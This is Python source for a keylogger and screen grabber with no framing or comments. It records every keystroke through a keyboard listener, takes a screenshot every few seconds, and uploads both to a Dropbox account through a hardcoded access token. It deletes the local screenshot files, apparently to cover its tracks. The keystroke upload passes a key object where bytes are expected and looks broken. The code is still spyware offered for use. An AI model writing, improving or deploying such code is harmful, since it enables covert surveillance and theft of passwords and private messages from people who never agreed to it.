from pynput.keyboard import Key, Listener
import os
import threading
import time
import dropbox
from PIL import ImageGrab

token = 'sl.BkMgw2H9P4TpYpiU7adUKYIbf72ETTtP0C1XQEUPj2otzLYZK6f7a899-SfvgFB7xM0SmmjfDqQEqLYUJhAe8wTBKRfejP9qsXAZJ2bAMYuokwp61oLc00yoDgVwB3ahKA21aXZ-eO8l'
dbx = dropbox.Dropbox(token)
screen_lock = threading.Lock()

j=0

def keys():
    global j
    j+=1
    def on_release(key):
        if key == Key.esc:
            return False

    def on_press(key):
        p_key = key
        write_file(p_key)

    def write_file(p_key):
        file_path = f"/KEYS/file_{j}.txt"        
        try:
            dbx.files_upload(p_key , file_path, mode=dropbox.files.WriteMode("overwrite"))
        except:
            print("Error")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def send_screenshot():
    i = 0
    while True:
        i += 1
        screen = ImageGrab.grab()
        pic_path = f"screenshot_{i}.png"
        screen.save(pic_path)
        
        with open(pic_path, "rb") as f:
            try:
                dbx.files_upload(f.read(), f"/Pictures/{pic_path}", mode=dropbox.files.WriteMode("overwrite"))
            except:
                pass      
        time.sleep(1)        
        try:
            os.remove(pic_path)
        except OSError as e:
            pass
        
        time.sleep(5)


def main():
    t1 = threading.Thread(target=send_screenshot)
    t2 = threading.Thread(target=keys)
    t1.start()
    t2.start()

if __name__ == "__main__":
    main()
